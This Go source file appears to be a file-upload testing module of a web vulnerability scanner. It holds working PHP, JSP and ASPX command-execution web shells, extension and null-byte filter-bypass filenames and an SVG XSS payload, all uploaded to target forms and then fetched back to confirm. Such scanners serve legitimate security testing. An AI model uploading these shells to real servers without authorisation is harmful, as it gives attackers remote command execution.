package modules

import (
	"bytes"
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"github.com/SentinelXofficial/sxel/pkg/engine"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func ScanFileUpload(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	for _, form := range target.Forms {
		fileInput := findFileInput(form)
		if fileInput == nil {
			continue
		}

		action := form.Action
		if action == "" {
			action = target.URL
		}

		if cfg.Verbose {
			output.Verbose("[file-upload] form=%s input=%s", action, fileInput.Name)
		}

		type testCase struct {
			filename    string
			content     string
			contentType string
			label       string
		}

		cases := []testCase{
			{
				"shell.php",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"PHP shell with image/jpeg MIME",
			},
			{
				"shell.jsp",
				"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
				"image/jpeg",
				"JSP shell with image/jpeg MIME",
			},
			{
				"shell.aspx",
				"<%@ Page Language=\"C#\"%><%Response.Write(Request[\"cmd\"]);%>",
				"image/jpeg",
				"ASPX shell with image/jpeg MIME",
			},
			{
				"shell.phtml",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"PHP alternative extension .phtml",
			},
			{
				"shell.php5",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"PHP alternative extension .php5",
			},
			{
				"image.jpg.php",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"Double extension .jpg.php",
			},
			{
				"image.php.jpg",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"Double extension .php.jpg",
			},
			{
				"shell.php\x00.jpg",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"Null-byte injection (.php\\0.jpg)",
			},
			{
				"payload.svg",
				`<svg xmlns="http://www.w3.org/2000/svg"><script>alert('sxel-xss')</script></svg>`,
				"image/svg+xml",
				"SVG with embedded XSS",
			},
		}

		for _, tc := range cases {
			buf, ct := buildMultipart(form, fileInput.Name, tc.filename, tc.content, tc.contentType)
			if buf == nil {
				continue
			}

			req, err := http.NewRequest("POST", action, buf)
			if err != nil {
				continue
			}
			core.ApplyHeaders(req, cfg)
			req.Header.Set("Content-Type", ct)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			respStr := core.ReadBody(resp.Body)
			resp.Body.Close()

			if uploaded, evidence, confirmed := detectUploadSuccess(resp, respStr, tc.filename, action, client, cfg); uploaded {
				sev := "LOW"
				if confirmed {
					sev = "HIGH"
				}
				results = append(results, core.ScanResult{
					Type:      "File Upload Vulnerability",
					URL:       action,
					Method:    "POST",
					Parameter: fileInput.Name,
					Payload:   tc.filename,
					Severity:  sev,
					Evidence:  fmt.Sprintf("[%s] %s", tc.label, evidence),
					Timestamp: time.Now(),
				})
			}
		}
	}

	return results
}

func findFileInput(f core.Form) *core.Input {
	for i := range f.Inputs {
		if strings.EqualFold(f.Inputs[i].Type, "file") {
			return &f.Inputs[i]
		}
	}
	return nil
}

func buildMultipart(form core.Form, fileField, filename, content, mimeType string) (*bytes.Buffer, string) {
	buf := &bytes.Buffer{}
	w := multipart.NewWriter(buf)

	for _, inp := range form.Inputs {
		if strings.EqualFold(inp.Type, "file") {
			continue
		}
		val := inp.Value
		if val == "" {
			val = "test"
		}
		_ = w.WriteField(inp.Name, val)
	}

	h := make(map[string][]string)
	h["Content-Disposition"] = []string{
		fmt.Sprintf(`form-data; name="%s"; filename="%s"`, fileField, filename),
	}
	h["Content-Type"] = []string{mimeType}
	part, err := w.CreatePart(h)
	if err != nil {
		return nil, ""
	}
	_, _ = io.WriteString(part, content)
	_ = w.Close()
	return buf, w.FormDataContentType()
}

func detectUploadSuccess(resp *http.Response, body, filename, baseURL string, client *http.Client, cfg *core.Config) (bool, string, bool) {
	status := resp.StatusCode
	low := strings.ToLower(body)

	rejectionPhrases := []string{"invalid", "error", "rejected", "not allowed", "forbidden", "file type", "extension"}
	isRejected := func(s string) bool {
		sl := strings.ToLower(s)
		for _, r := range rejectionPhrases {
			if strings.Contains(sl, r) {
				return true
			}
		}
		return false
	}
	successPhrases := []string{"success", "uploaded", "saved", "stored"}
	successish := func(s string) bool {
		sl := strings.ToLower(s)
		for _, kw := range successPhrases {
			if strings.Contains(sl, kw) {
				return true
			}
		}
		return false
	}

	if status == 301 || status == 302 {
		loc := resp.Header.Get("Location")
		if loc != "" {
			base, err := url.Parse(baseURL)
			if err != nil {
				return false, "", false
			}
			fileURL := engine.ResolveURL(base, loc)
			accStatus := 0
			if fileURL != "" {
				accBody, accStatus, err := core.DoGET(client, cfg, fileURL)
				if err == nil && accStatus == 200 {
					if strings.Contains(accBody, "<?php") || strings.Contains(accBody, "<%") {
						return true, fmt.Sprintf("redirect to %s — file is accessible and contains server-side code (HTTP %d)", fileURL, accStatus), true
					}
					return true, fmt.Sprintf("redirect to %s — file accessible (HTTP %d)", fileURL, accStatus), true
				}
			}
			if accStatus != 200 &&
				strings.Contains(low, strings.ToLower(filename)) &&
				successish(low) && !isRejected(low) {
				return true, fmt.Sprintf("HTTP %d — filename %q echoed with success wording, but file fetch-back failed (HTTP %d)", status, filename, accStatus), false
			}
			return false, "", false
		}
	}

	if status >= 200 && status < 400 {
		if strings.Contains(low, strings.ToLower(filename)) && successish(low) && !isRejected(low) {
			return true, fmt.Sprintf("HTTP %d — server echoed filename %q with success wording in response", status, filename), false
		}
	}

	return false, "", false
}
